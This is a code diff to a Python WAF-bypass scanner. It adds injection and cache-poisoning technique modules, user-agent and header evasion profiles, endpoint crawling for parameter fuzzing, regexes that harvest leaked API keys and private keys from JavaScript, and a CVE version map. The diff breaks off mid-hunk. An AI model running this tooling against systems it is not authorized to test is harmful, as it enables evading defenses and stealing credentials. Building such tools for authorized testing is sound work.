@@ -12,6 +12,7 @@ from urllib.parse import urlparse, urlencode, quote, quote_plus
 import time
 import hashlib
 import logging
+import difflib
 import socket
 import ssl
 import json
@@ -44,6 +45,37 @@ from .error_handler import (
 
 
 logger = logging.getLogger(__name__)
+
+
+_REAL_STDOUT = None
+
+
+def _quiet_stdout() -> None:
+    """Swallow human-readable progress output (pipeline/--json mode).
+
+    The original stdout is preserved so the final JSON can be written to it
+    cleanly. Logging is unaffected (it targets stderr / the log file).
+    """
+    global _REAL_STDOUT
+    import io
+    if _REAL_STDOUT is None:
+        _REAL_STDOUT = sys.stdout
+    sys.stdout = io.StringIO()
+
+
+def _emit_json_stdout(results) -> None:
+    """Write results as JSON to the real stdout (restoring it if quieted)."""
+    out = _REAL_STDOUT or sys.stdout
+    try:
+        sys.stdout = out
+    except Exception:
+        pass
+    try:
+        out.write(json.dumps(results, indent=2, default=str))
+        out.write('\n')
+        out.flush()
+    except Exception:
+        builtins.print(json.dumps(results, default=str))
 
 
 def _configure_console_output() -> None:
@@ -550,6 +582,7 @@ SCAN_CATEGORIES = {
             '_test_cache_poisoning',
             '_test_web_cache_deception',
             '_test_range_header_attacks',
+            '_test_cache_poisoning_deep',
         ]
     },
     'injection_testing': {
@@ -574,6 +607,9 @@ SCAN_CATEGORIES = {
             '_test_dangling_markup',
             '_test_css_injection',
             '_test_xslt_injection',
+            '_test_json_sqli_bypass',
+            '_test_dom_xss',
+            '_test_client_side_path_traversal',
         ]
     },
     'security_misconfig': {
@@ -609,6 +645,7 @@ SCAN_CATEGORIES = {
         'techniques': [
             '_test_jwt_oauth_bypass',
             '_test_jwt_attacks',
+            '_test_oauth_oidc',
         ]
     },
     'graphql_attacks': {
@@ -647,6 +684,7 @@ SCAN_CATEGORIES = {
             '_test_kubernetes_api',
             '_test_cloud_provider_detection',
             '_test_cloud_metadata_enumeration',
+            '_test_cloud_metadata_v2',
         ]
     },
     'advanced_payloads': {
@@ -658,6 +696,8 @@ SCAN_CATEGORIES = {
             '_test_integer_overflow',
             '_test_bot_detection_evasion',
             '_test_ipv6_bypass',
+            '_test_charset_confusion',
+            '_test_single_packet_race',
         ]
     },
     'info_disclosure': {
@@ -669,6 +709,7 @@ SCAN_CATEGORIES = {
             '_test_api_key_exposure',
             '_test_timing_based_discovery',
             '_test_error_based_disclosure',
+            '_test_js_secret_exposure',
         ]
     },
     'detection_recon': {
@@ -683,6 +724,7 @@ SCAN_CATEGORIES = {
             '_historical_dns_lookup',
             '_certificate_transparency_lookup',
             '_fingerprint_technology_stack',
+            '_test_cve_fingerprint',
         ]
     },
 }
@@ -763,6 +805,126 @@ BACKEND_PATTERNS = re.compile(
     re.IGNORECASE
 )
 
+# Optional HTTP/2 client (httpx). Used for the single-packet race attack and any
+# test that needs true HTTP/2 multiplexing. Degrades gracefully when unavailable.
+try:
+    import httpx  # type: ignore
+    _HTTPX_AVAILABLE = True
+except Exception:  # pragma: no cover - optional dependency
+    httpx = None
+    _HTTPX_AVAILABLE = False
+
+# Secret/API-key regexes reused for scanning JavaScript bundles.
+JS_SECRET_PATTERNS = {
+    'AWS Access Key': r'AKIA[0-9A-Z]{16}',
+    'GitHub Token': r'ghp_[0-9a-zA-Z]{36}',
+    'Google API Key': r'AIza[0-9A-Za-z\-_]{35}',
+    'Stripe Live': r'sk_live_[0-9a-zA-Z]{24}',
+    'Slack Token': r'xox[baprs]-[0-9]{10,13}-[0-9]{10,13}[a-zA-Z0-9-]*',
+    'JWT Token': r'eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]*',
+    'Private Key': r'-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----',
+    'Firebase Config': r'apiKey["\']?\s*[:=]\s*["\']AIza[0-9A-Za-z\-_]{35}',
+    'Generic API Key': r'(?:api[_-]?key|apikey|secret|token)["\']?\s*[:=]\s*["\'][0-9a-zA-Z\-_]{16,}["\']',
+    'Google OAuth Client': r'[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com',
+}
+
+# Minimal version -> known-CVE map for tech-stack fingerprinting. Conservative:
+# only well-known, high-signal CVEs keyed by lowercase product + a version regex.
+CVE_VERSION_MAP = [
+    # (product_substring, version_regex, cve, severity, note)
+    ('openssl', r'1\.0\.1[ -].*', 'CVE-2014-0160', 'CRITICAL', 'Heartbleed'),
+    ('apache', r'2\.4\.49', 'CVE-2021-41773', 'CRITICAL', 'Path traversal/RCE'),
+    ('apache', r'2\.4\.50', 'CVE-2021-42013', 'CRITICAL', 'Path traversal/RCE'),
+    ('nginx', r'1\.(?:[0-9]|1[0-9]|20)\.', 'CVE-2021-23017', 'HIGH', 'DNS resolver off-by-one'),
+    ('php', r'(?:7\.|8\.0\.|8\.1\.[0-2]\b)', 'CVE-2024-4577', 'CRITICAL', 'CGI argument injection (Windows)'),
+    ('iis', r'7\.5', 'CVE-2015-1635', 'HIGH', 'HTTP.sys RCE (MS15-034)'),
+    ('tomcat', r'9\.0\.[0-9]\b', 'CVE-2020-1938', 'HIGH', 'Ghostcat AJP file read'),
+    ('jenkins', r'2\.4(?:[0-3][0-9]|41)', 'CVE-2024-23897', 'CRITICAL', 'Arbitrary file read'),
+    ('exim', r'4\.(?:[0-8][0-9])', 'CVE-2019-10149', 'CRITICAL', 'RCE'),
+    ('log4j', r'2\.(?:[0-9]|1[0-6])\.', 'CVE-2021-44228', 'CRITICAL', 'Log4Shell'),
+]
+
+# Patterns for dynamic tokens that change on every response. These are stripped
+# before comparing a candidate body to the baseline so that CSRF tokens, nonces,
+# timestamps, request ids, etc. do not produce false "different content" bypasses.
+DYNAMIC_TOKEN_PATTERNS = re.compile(
+    r'(?:'
+    r'csrf[_-]?token|csrfmiddlewaretoken|authenticity_token|__requestverificationtoken|'
+    r'__viewstate|__eventvalidation|__viewstategenerator|'
+    r'nonce|request[_-]?id|x-request-id|trace[_-]?id|correlation[_-]?id|'
+    r'sessionid|jsessionid|phpsessid|csrf|xsrf'
+    r')["\'=:\s]+[^"\'<>&\s]{6,}',
+    re.IGNORECASE,
+)
+# Generic high-entropy / volatile substrings (uuids, hex blobs, iso timestamps, epoch).
+UUID_PATTERN = re.compile(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', re.IGNORECASE)
+HEXBLOB_PATTERN = re.compile(r'\b[0-9a-f]{16,}\b', re.IGNORECASE)
+ISO_TS_PATTERN = re.compile(r'\d{4}-\d{2}-\d{2}[t ]\d{2}:\d{2}:\d{2}', re.IGNORECASE)
+EPOCH_PATTERN = re.compile(r'\b1[5-9]\d{8,11}\b')  # 10-13 digit unix timestamps
+
+
+def _normalize_body(text: str, limit: int = 20000) -> str:
+    """Strip volatile tokens from a response body so baselines compare stably.
+
+    Removes CSRF/nonce/session tokens, UUIDs, long hex blobs, ISO timestamps and
+    epoch values. Used by the baseline jitter logic and similarity scoring.
+    """
+    if not text:
+        return ""
+    sample = text[:limit]
+    sample = DYNAMIC_TOKEN_PATTERNS.sub('<TOKEN>', sample)
+    sample = UUID_PATTERN.sub('<UUID>', sample)
+    sample = ISO_TS_PATTERN.sub('<TS>', sample)
+    sample = EPOCH_PATTERN.sub('<EPOCH>', sample)
+    sample = HEXBLOB_PATTERN.sub('<HEX>', sample)
+    return sample
+
+
+class _AdaptiveLimiter:
+    """Adaptive concurrency limiter.
+
+    Wraps a semaphore whose effective cap shrinks when the target pushes back
+    (429/503) and slowly recovers after sustained success. Combined with a single
+    shared thread pool this makes the configured thread count a real ceiling on
+    in-flight requests instead of an exploding nested-pool multiplier.
+    """
+
+    def __init__(self, max_concurrency: int):
+        self.max_concurrency = max(1, int(max_concurrency))
+        self._sem = threading.Semaphore(self.max_concurrency)
+        self._lock = threading.Lock()
+        self._cap = self.max_concurrency   # current allowed concurrency
+        self._reserved = 0                 # permits withheld to shrink the cap
+        self._success = 0
+
+    def acquire(self):
+        self._sem.acquire()
+
+    def release(self):
+        self._sem.release()
+
+    def penalize(self):
+        """Shrink concurrency by withholding a permit (floor of 1)."""
+        with self._lock:
+            if self._cap > 1 and self._sem.acquire(blocking=False):
+                self._cap -= 1
+                self._reserved += 1
+            self._success = 0
+
+    def reward(self):
+        """Return a withheld permit after a streak of clean responses."""
+        with self._lock:
+            self._success += 1
+            if self._success >= 25 and self._reserved > 0:
+                self._sem.release()
+                self._cap += 1
+                self._reserved -= 1
+                self._success = 0
+
+    @property
+    def current_cap(self) -> int:
+        return self._cap
+
 
 class CloudFrontBypasser:
     """Optimized WAF Bypass Scanner with connection pooling and smart detection"""
@@ -771,10 +933,10 @@ class CloudFrontBypasser:
     _session_pool: Dict[str, requests.Session] = {}
     _session_lock = threading.Lock()
     
-    def __init__(self, target: str, threads: int = 10, delay: float = 0.2, timeout: int = 5, proxy_config: dict = None, enable_http_logging: bool = False, enable_ssl_analysis: bool = False):
+    def __init__(self, target: str, threads: int = 10, delay: float = 0.2, timeout: int = 5, proxy_config: dict = None, enable_http_logging: bool = False, enable_ssl_analysis: bool = False, enable_crawl: bool = True, enable_schema: bool = True, custom_payloads: dict = None, plugins: list = None, evasion_profile: dict = None):
         """
         Initialize CloudFront WAF Bypasser
-        
+
         Args:
             target: Target URL to scan
             threads: Number of concurrent threads
@@ -783,7 +945,12 @@ class CloudFrontBypasser:
             proxy_config: Optional proxy configuration dict with 'type', 'host', 'port' keys
             enable_http_logging: Enable full HTTP request/response logging for forensic analysis
             enable_ssl_analysis: Enable SSL/TLS certificate and cipher analysis
-        
+            enable_crawl: Crawl the target to discover endpoints/params for injection fuzzing
+            enable_schema: Ingest OpenAPI/Swagger/GraphQL schemas to discover endpoints/params
+            custom_payloads: Optional dict {category: [payloads]} merged into injection tests
+            plugins: Optional list of loaded BypassPlugin instances run during the scan
+            evasion_profile: Optional dict of evasion settings (headers, user_agents, encoding)
+
         Raises:
             InvalidTargetError: If target URL is invalid
             InvalidThreadCountError: If threads is not positive
@@ -814,14 +981,37 @@ class CloudFrontBypasser:
         self._rate_limit_detected = False
         self._rate_limit_adjustments = 0
         self._original_delay = delay
-        self._max_delay = delay * 10  # Max 10x original delay
-        
+        self._max_delay = max(delay * 10, 2.0)  # Max 10x original delay (floor 2s)
+
+        # Single shared thread pool + adaptive concurrency limiter.
+        # Techniques run sequentially and fan their requests out across this one
+        # bounded pool, so `threads` is a real ceiling on concurrent requests
+        # rather than an exploding nested-pool multiplier.
+        self._executor: Optional[ThreadPoolExecutor] = None
+        self._limiter = _AdaptiveLimiter(threads)
+
         # Baseline tracking
         self._baseline_size = None
         self._baseline_hash = None
         self._baseline_status = None
         self._baseline_headers = {}
         self._baseline_body_sample = ""
+        self._baseline_norm = ""        # normalized baseline body for similarity
+        self._baseline_jitter = 0       # observed size jitter band (bytes)
+        self._baseline_dynamic = False  # True if the page changes between loads
+
+        # Discovered endpoints/params (populated by the crawler / schema ingestion).
+        # Each entry: {'path': str, 'params': {name: value}, 'method': str}
+        self.crawl_targets: List[Dict[str, Any]] = []
+        self.enable_crawl = enable_crawl
+        self.enable_schema = enable_schema
+
+        # Optional extensibility wired into the engine (custom payloads, plugins,
+        # evasion profiles). These were previously stored in the DB/GUI but never
+        # consumed by the scanner.
+        self.custom_payloads: Dict[str, List[str]] = custom_payloads or {}
+        self._loaded_plugins = plugins or []
+        self.evasion_profile = evasion_profile or {}
         
         # Response cache to avoid duplicate requests
         self._response_cache: Dict[str, Dict] = {}
@@ -846,8 +1036,31 @@ class CloudFrontBypasser:
         
         # Initialize optimized session with connection pooling
         self._session = self._get_optimized_session()
-        
+        self._apply_evasion_profile()
+
         logger.info(f"Initialized scanner for {self.target}")
+
+    def _apply_evasion_profile(self) -> None:
+        """Apply an evasion profile's header/UA tweaks to the live session.
+
+        Supported keys (all optional):
+          * 'user_agent' / 'user_agents' : fixed UA or a rotation pool
+          * 'headers'                    : dict of extra headers to send
+        Technique selection from a profile's 'techniques' list is honored in scan().
+        """
+        profile = self.evasion_profile or {}
+        try:
+            uas = profile.get('user_agents') or ([profile['user_agent']] if profile.get('user_agent') else [])
+            if uas:
+                self._evasion_user_agents = list(uas)
+                self._session.headers['User-Agent'] = uas[0]
+            extra = profile.get('headers')
+            if isinstance(extra, dict):
+                self._session.headers.update(extra)
+            if profile.get('name'):
+                logger.info(f"Applied evasion profile: {profile.get('name')}")
+        except Exception as e:
+            logger.debug(f"Evasion profile apply error: {e}")
     
     def _get_optimized_session(self) -> requests.Session:
         """Create an optimized session with connection pooling and retry logic"""
@@ -968,12 +1181,38 @@ class CloudFrontBypasser:
             self._baseline_hash = hashlib.md5(baseline.content).hexdigest()
             self._baseline_status = baseline.status_code
             self._baseline_headers = dict(baseline.headers)
-            
+            self._baseline_body_sample = baseline.text[:5000] if baseline.content else ""
+            self._baseline_norm = _normalize_body(baseline.text if baseline.content else "")
+
+            # Multi-sample: fetch the baseline a couple more times to learn the
+            # natural jitter of the page. Pages with CSRF tokens / timestamps change
+            # size every load; without this, every probe looks like a "bypass".
+            sizes = [self._baseline_size]
+            norms = [self._baseline_norm]
+            for _ in range(2):
+                try:
+                    extra = self._get_baseline()
+                    if extra is not None:
+                        sizes.append(len(extra.content))
+                        norms.append(_normalize_body(extra.text if extra.content else ""))
+                except Exception:
+                    break
+
+            self._baseline_jitter = (max(sizes) - min(sizes)) if len(sizes) > 1 else 0
+            # The page is "dynamic" if raw size moves but normalized content is stable
+            # (i.e. only tokens/timestamps change), or if size jitter is non-trivial.
+            norm_stable = len(set(norms)) == 1
+            self._baseline_dynamic = (self._baseline_jitter > 0) or (not norm_stable)
+            # Use the most common normalized body as the reference.
+            self._baseline_norm = max(set(norms), key=norms.count) if norms else ""
+
             logger.info(
                 f"Baseline established: {self._baseline_status} | "
-                f"{self._baseline_size} bytes | {self._baseline_hash[:8]}"
+                f"{self._baseline_size} bytes | jitter={self._baseline_jitter}b | "
+                f"dynamic={self._baseline_dynamic} | {self._baseline_hash[:8]}"
             )
-            print(f"[+] Baseline: {self._baseline_status} | Size: {self._baseline_size} bytes")
+            print(f"[+] Baseline: {self._baseline_status} | Size: {self._baseline_size} bytes "
+                  f"| jitter: ±{self._baseline_jitter}b | dynamic: {self._baseline_dynamic}")
         
         except BaselineFailedError:
             raise
@@ -1003,7 +1242,15 @@ class CloudFrontBypasser:
         detected_os, os_confidence, os_results = self._detect_target_os()
         if os_results:
             self.results.extend(os_results)
-        
+
+        # Discover real endpoints + params so injection tests hit live inputs.
+        if self.enable_crawl or self.enable_schema:
+            print("\n[*] Phase 2.5: Endpoint & Parameter Discovery...")
+            try:
+                self._run_discovery()
+            except Exception as e:
+                logger.debug(f"Discovery phase error: {e}")
+
         print("\n[*] Phase 3: Testing bypass techniques...")
         
         # Build technique list based on selected categories
@@ -1120,6 +1367,17 @@ class CloudFrontBypasser:
             '_historical_dns_lookup': self._historical_dns_lookup,
             '_certificate_transparency_lookup': self._certificate_transparency_lookup,
             '_fingerprint_technology_stack': self._fingerprint_technology_stack,
+            # New modules (v1.5)
+            '_test_json_sqli_bypass': self._test_json_sqli_bypass,
+            '_test_charset_confusion': self._test_charset_confusion,
+            '_test_cache_poisoning_deep': self._test_cache_poisoning_deep,
+            '_test_oauth_oidc': self._test_oauth_oidc,
+            '_test_js_secret_exposure': self._test_js_secret_exposure,
+            '_test_cve_fingerprint': self._test_cve_fingerprint,
+            '_test_single_packet_race': self._test_single_packet_race,
+            '_test_cloud_metadata_v2': self._test_cloud_metadata_v2,
+            '_test_dom_xss': self._test_dom_xss,
+            '_test_client_side_path_traversal': self._test_client_side_path_traversal,
         }
         
         # Build technique list from selected categories
@@ -1132,7 +1390,16 @@ class CloudFrontBypasser:
                     if technique_name in technique_map and technique_name not in added_techniques:
                         techniques.append(technique_map[technique_name])
                         added_techniques.add(technique_name)
-        
+
+        # Honor an evasion profile's curated technique list (augments selection).
+        profile_techniques = (self.evasion_profile or {}).get('techniques')
+        if profile_techniques:
+            for technique_name in profile_techniques:
+                if technique_name in technique_map and technique_name not in added_techniques:
+                    techniques.append(technique_map[technique_name])
+                    added_techniques.add(technique_name)
+            print(f"[*] Evasion profile added {len(profile_techniques)} curated technique(s)")
+
         # Filter techniques based on detected OS
         original_count = len(techniques)
         techniques = self._filter_techniques_by_os(techniques, detected_os)
@@ -1144,37 +1411,175 @@ class CloudFrontBypasser:
         else:
             print(f"[*] Running {len(techniques)} techniques from {len(selected_categories)} categories\n")
         
-        # Execute techniques with error handling
+        # Execute techniques against ONE shared, bounded thread pool.
+        # Each technique runs sequentially and fans its own requests out across this
+        # pool, so total in-flight requests never exceed self.threads (no nested
+        # pool explosion). The adaptive limiter throttles further under WAF pushback.
         error_count = 0
+        self._executor = ThreadPoolExecutor(max_workers=self.threads)
         try:
-            with ThreadPoolExecutor(max_workers=self.threads) as executor:
-                futures = {executor.submit(technique): technique.__name__ for technique in techniques}
-                
-                for future in as_completed(futures):
-                    technique_name = futures[future]
-                    try:
-                        result = future.result()
-                        if result:
-                            self.results.extend(result)
-                    except KeyboardInterrupt:
-                        logger.warning("Scan interrupted by user")
-                        raise ScanInterruptedError("Scan interrupted by user")
-                    except Exception as e:
-                        error_count += 1
-                        logger.error(f"Error in {technique_name}: {e}")
-                        # Continue with other techniques
-        
+            for technique in techniques:
+                try:
+                    result = technique()
+                    if result:
+                        self.results.extend(result)
+                except KeyboardInterrupt:
+                    logger.warning("Scan interrupted by user")
+                    raise ScanInterruptedError("Scan interrupted by user")
+                except Exception as e:
+                    error_count += 1
+                    logger.error(f"Error in {technique.__name__}: {e}")
+                    # Continue with other techniques
+
+            # Run user plugins + AI triage as post-processing phases.
+            try:
+                self._run_plugins()
+            except Exception as e:
+                logger.debug(f"Plugin phase error: {e}")
         except KeyboardInterrupt:
             logger.warning("Scan interrupted by user")
             raise ScanInterruptedError("Scan interrupted by user")
-        
+        finally:
+            self._executor.shutdown(wait=True)
+            self._executor = None
+
         if error_count > 0:
             logger.warning(f"Scan completed with {error_count} technique errors")
             print(f"\n[!] Warning: {error_count} techniques encountered errors")
-        
+
         logger.info(f"Scan complete: Found {len(self.results)} bypasses")
         return self.results
-    
+
+    def _run_plugins(self) -> None:
+        """Execute user-supplied bypass plugins as a scan phase.
+
+        Plugins are loaded from the plugins directory and given the live session
+        and target. Whatever findings they return are normalized and appended to
+        results. Safe no-op if the plugin system is unavailable or no plugins are
+        installed. Fully wired by the plugin-integration phase.
+        """
+        plugins = getattr(self, '_loaded_plugins', None)
+        if not plugins:
+            return
+        print(f"\n[*] Running {len(plugins)} user plugin(s)...")
+        for plugin in plugins:
+            try:
+                if not getattr(plugin, 'enabled', True):
+                    continue
+                outcome = plugin.execute(self.target, self._session,
+                                         baseline_status=self._baseline_status,
+                                         baseline_size=self._baseline_size)
+                for norm in self._normalize_plugin_results(plugin, outcome):
+                    self.results.append(norm)
+                    if norm.get('bypass'):
+                        print(f"  [✓] PLUGIN BYPASS: {norm['technique']} | {norm['reason']} | {norm['severity']}")
+            except Exception as e:
+                logger.debug(f"Plugin '{getattr(plugin, 'name', '?')}' failed: {e}")
+
+    def _normalize_plugin_results(self, plugin, outcome) -> List[Dict[str, Any]]:
+        """Coerce a plugin's return value into standard result dicts."""
+        if not outcome:
+            return []
+        items = outcome if isinstance(outcome, list) else [outcome]
+        normalized = []
+        for item in items:
+            if not isinstance(item, dict):
+                continue
+            normalized.append({
+                'bypass': bool(item.get('bypass', item.get('success', False))),
+                'status': item.get('status', 0),
+                'headers': item.get('headers', {}),
+                'method': item.get('method', 'GET'),
+                'path': item.get('path', '/'),
+                'size': item.get('size', 0),
+                'technique': item.get('technique', f"Plugin: {getattr(plugin, 'name', 'custom')}"),
+                'reason': item.get('reason', item.get('message', 'Plugin result')),
+                'severity': item.get('severity', 'INFO'),
+                'category': item.get('category', 'PLUGIN'),
+            })
+        return normalized
+
+    def _run_discovery(self) -> None:
+        """Discover real endpoints + parameters via crawling and schema ingestion.
+
+        Populates ``self.crawl_targets`` so that injection techniques fuzz live
+        inputs instead of only probing ``/``.
+        """
+        discovered: Dict[str, Dict[str, Any]] = {}
+
+        def _merge(items):
+            for ep in items or []:
+                path = ep.get('path') or '/'
+                params = ep.get('params') or {}
+                method = ep.get('method', 'GET')
+                key = f"{method}:{path}:{','.join(sorted(params.keys()))}"
+                if key not in discovered:
+                    discovered[key] = {'path': path, 'params': dict(params), 'method': method}
+
+        if self.enable_crawl:
+            try:
+                from .crawler import crawl_target
+                print("[*] Crawling target for endpoints & parameters...")
+                eps = crawl_target(self.target, self._session, timeout=self.timeout,
+                                   limiter=self._limiter)
+                _merge(eps)
+                print(f"    Crawler found {len(eps)} parameterized endpoint(s)")
+            except Exception as e:
+                logger.debug(f"Crawl phase error: {e}")
+
+        if self.enable_schema:
+            try:
+                from .schema_ingest import ingest_schemas
+                print("[*] Ingesting OpenAPI/Swagger/GraphQL schemas...")
+                eps = ingest_schemas(self.target, self._session, timeout=self.timeout)
+                _merge(eps)
+                print(f"    Schema ingestion found {len(eps)} endpoint(s)")
+            except Exception as e:
+                logger.debug(f"Schema phase error: {e}")
+
+        self.crawl_targets = list(discovered.values())
+        if self.crawl_targets:
+            print(f"[+] Discovery complete: {len(self.crawl_targets)} testable endpoint(s)")
+
+    def _injection_targets(self) -> List[Dict[str, Any]]:
+        """GET endpoints with parameters worth fuzzing.
+
+        Falls back to a single root entry with a synthetic param so legacy probes
+        still run when nothing was discovered.
+        """
+        targets = [t for t in self.crawl_targets
+                   if t.get('method', 'GET') == 'GET' and t.get('params')]
+        return targets
+
+    def _fuzz_param_endpoints(self, payloads: List[str], technique_prefix: str,
+                              category: str = None, max_endpoints: int = 15,
+                              max_payloads: int = 8) -> List[Dict[str, Any]]:
+        """Inject ``payloads`` into each discovered parameter and batch-test.
+
+        For every discovered GET endpoint, each parameter is fuzzed in turn while
+        the other params keep their benign values, so requests stay realistic.
+        """
+        from .crawler import build_injection_path
+        targets = self._injection_targets()
+        if not targets:
+            return []
+        test_cases = []
+        for ep in targets[:max_endpoints]:
+            path, params = ep['path'], ep['params']
+            for pname in params:
+                for payload in payloads[:max_payloads]:
+                    inj = build_injection_path(path, params, pname, payload)
+                    test_cases.append({
+                        'headers': {},
+                        'path': inj,
+                        'technique': f'{technique_prefix} [{pname}]: {payload[:30]}',
+                    })
+        results = self._batch_test(test_cases) if test_cases else []
+        if category:
+            for r in results:
+                r.setdefault('category', category)
+        return results
+
     @retry_on_network_error(max_retries=3, backoff_factor=0.5)
     def _get_baseline(self) -> Optional[requests.Response]:
         """
@@ -1401,79 +1806,102 @@ class CloudFrontBypasser:
         self,
         headers: Optional[dict] = None,
         method: str = 'GET',
-        path: str = '/'
+        path: str = '/',
+        technique: Optional[str] = None,
+        data: Any = None,
     ) -> Optional[Dict[str, Any]]:
         """
-        Test a single request configuration with error handling
-        
+        Test a single request configuration with error handling.
+
+        The technique label is tracked out-of-band: ``X-Technique`` is NEVER sent
+        to the target (it would fingerprint the scanner and trip custom-header WAF
+        rules). If a legacy caller passes ``X-Technique`` inside ``headers`` it is
+        popped off and used as the technique label only.
+
         Args:
-            headers: Request headers
+            headers: Request headers (X-Technique, if present, is stripped)
             method: HTTP method
-            path: URL path
-        
+            path: URL path (may include a query string)
+            technique: Human-readable technique label (kept off the wire)
+            data: Optional request body
+
         Returns:
             Result dictionary or None if request failed
         """
         url = f"{self.target}{path}"
-        
-        # Generate cache key for deduplication
-        cache_key = f"{method}:{path}:{hash(frozenset((headers or {}).items()))}"
-        
-        # Check cache first
+
+        # Work on a private copy and strip the out-of-band technique marker so it
+        # never reaches the target and never pollutes the cache key.
+        headers = dict(headers) if headers else {}
+        marker = headers.pop('X-Technique', None)
+        if technique is None:
+            technique = marker or 'Unknown'
+
+        # Cache key based ONLY on what actually goes on the wire (real headers).
+        body_key = '' if data is None else hash(repr(data))
+        cache_key = f"{method}:{path}:{body_key}:{hash(frozenset(headers.items()))}"
+
+        # Check cache first (now actually hits, because the key is technique-free)
         with self._cache_lock:
             if cache_key in self._response_cache:
-                return self._response_cache[cache_key]
-        
+                cached = dict(self._response_cache[cache_key])
+                cached['technique'] = technique  # keep caller's label
+                return cached
+
+        req_headers = dict(self._session.headers)
+        req_headers.update(headers)
+
+        # Adaptive concurrency: bound in-flight requests and pace under pushback.
+        self._limiter.acquire()
         try:
-            # Use session for connection pooling
-            req_headers = dict(self._session.headers)
-            if headers:
-                req_headers.update(headers)
-            
             resp = self._session.request(
                 method=method,
                 url=url,
                 headers=req_headers,
+                data=data,
                 timeout=self.timeout,
                 allow_redirects=False,
                 verify=False
             )
-            
+
             # Log HTTP transaction for forensic analysis
             self._log_http_transaction(method, url, req_headers, resp)
-            
+
             if resp is None:
                 return None
-            
-            # Rate limit detection and auto-adjustment
+
+            # Rate limit detection and adaptive throttle
             if resp.status_code in [429, 503]:
                 self._handle_rate_limit(resp)
-            
-            # Rate limiting - use current delay (may have been adjusted)
+                self._limiter.penalize()
+            else:
+                self._limiter.reward()
+
+            # Pacing delay (may have been adjusted by rate-limit handling)
             if self.delay > 0:
                 time.sleep(self.delay)
-            
+
             # Check if bypass succeeded
             bypass_result = self._is_bypass_fast(resp)
-            
+
             result = {
                 'bypass': bypass_result['bypass'],
                 'status': resp.status_code,
-                'headers': {k: v for k, v in (headers or {}).items() if k != 'X-Technique'},
+                'headers': dict(headers),
                 'method': method,
                 'path': path,
                 'size': len(resp.content),
-                'technique': headers.get('X-Technique', 'Unknown') if headers else 'Unknown',
+                'technique': technique,
                 'reason': bypass_result['reason'],
                 'severity': bypass_result['severity']
             }
-            
+
             # Cache result
             with self._cache_lock:
                 self._response_cache[cache_key] = result
-            
+
             return result
-            
+
         except requests.exceptions.Timeout:
             logger.debug(f"Timeout for {method} {path}")
             self._log_http_transaction(method, url, req_headers, None, error='Timeout')
@@ -1486,6 +1914,8 @@ class CloudFrontBypasser:
             logger.debug(f"Request failed for {method} {path}: {e}")
             self._log_http_transaction(method, url, req_headers, None, error=str(e))
             return None
+        finally:
+            self._limiter.release()
     
     def _is_bypass_fast(self, response: requests.Response) -> Dict[str, Any]:
         """Optimized bypass detection with pre-compiled patterns"""
@@ -1502,7 +1932,7 @@ class CloudFrontBypasser:
         try:
             content = response.content
             current_size = len(content)
-            
+
             # CRITICAL: Status code changed from blocked to allowed
             if self._baseline_status in [403, 401, 429] and status == 200:
                 return {
@@ -1510,30 +1940,44 @@ class CloudFrontBypasser:
                     'reason': f'Auth bypass: {self._baseline_status} → {status}',
                     'severity': 'CRITICAL'
                 }
-            
-            # Quick size comparison
+
+            # Size comparison that accounts for the baseline's natural jitter band.
+            # Effective change must exceed the observed jitter before it counts.
             if self._baseline_size > 0:
-                size_diff = abs(current_size - self._baseline_size)
+                raw_diff = abs(current_size - self._baseline_size)
+                size_diff = max(0, raw_diff - self._baseline_jitter)
                 size_diff_percent = (size_diff / self._baseline_size) * 100
-                
-                # HIGH: Significant size difference (>15% change)
+
+                # HIGH: Significant size difference beyond jitter (>15% change)
                 if size_diff_percent > 15 and size_diff > 200:
                     return {
                         'bypass': True,
-                        'reason': f'Content diff: {size_diff_percent:.0f}% change',
+                        'reason': f'Content diff: {size_diff_percent:.0f}% change (jitter ±{self._baseline_jitter}b)',
                         'severity': 'HIGH'
                     }
-            
-            # Only compute hash if size is similar (optimization)
-            if abs(current_size - self._baseline_size) < 500:
-                current_hash = hashlib.md5(content).hexdigest()
-                if current_hash != self._baseline_hash:
-                    return {
-                        'bypass': True,
-                        'reason': 'Different content (hash mismatch)',
-                        'severity': 'HIGH'
-                    }
-            
+
+            # Content comparison. For static pages a raw hash mismatch is enough; for
+            # dynamic pages compare NORMALIZED bodies via similarity ratio so that
+            # CSRF tokens / timestamps don't masquerade as bypasses.
+            if abs(current_size - self._baseline_size) <= max(500, self._baseline_jitter):
+                if not self._baseline_dynamic:
+                    current_hash = hashlib.md5(content).hexdigest()
+                    if current_hash != self._baseline_hash:
+                        return {
+                            'bypass': True,
+                            'reason': 'Different content (hash mismatch)',
+                            'severity': 'HIGH'
+                        }
+                else:
+                    cur_norm = _normalize_body(response.text if current_size else "")
+                    ratio = difflib.SequenceMatcher(None, self._baseline_norm, cur_norm).quick_ratio()
+                    if ratio < 0.90:
+                        return {
+                            'bypass': True,
+                            'reason': f'Different content ({ratio*100:.0f}% similar after token-normalization)',
+                            'severity': 'HIGH'
+                        }
+
             # Check response body for error indicators (first 3KB only for speed)
             body_sample = response.text[:3000].lower() if current_size > 0 else ""
             
@@ -1617,9 +2061,10 @@ class CloudFrontBypasser:
         try:
             current_size = len(response.content)
             current_hash = hashlib.md5(response.content).hexdigest()
-            size_diff = abs(current_size - self._baseline_size)
+            raw_diff = abs(current_size - self._baseline_size)
+            size_diff = max(0, raw_diff - self._baseline_jitter)
             size_diff_percent = (size_diff / self._baseline_size) * 100 if self._baseline_size > 0 else 0
-            
+
             # CRITICAL: Status code changed from blocked to allowed
             if self._baseline_status in [403, 401] and response.status_code == 200:
                 return {
@@ -1627,22 +2072,32 @@ class CloudFrontBypasser:
                     'reason': f'Authentication bypass: {self._baseline_status} → {response.status_code}',
                     'severity': 'CRITICAL'
                 }
-            
-            # HIGH: Significant size difference (different content)
+
+            # HIGH: Significant size difference beyond jitter (different content)
             if size_diff_percent > 10:
                 return {
                     'bypass': True,
-                    'reason': f'Content difference: {size_diff} bytes ({size_diff_percent:.1f}% change)',
+                    'reason': f'Content difference: {size_diff} bytes ({size_diff_percent:.1f}% beyond ±{self._baseline_jitter}b jitter)',
                     'severity': 'HIGH'
                 }
-            
-            # HIGH: Different content hash (even if size similar)
-            if current_hash != self._baseline_hash and size_diff > 100:
-                return {
-                    'bypass': True,
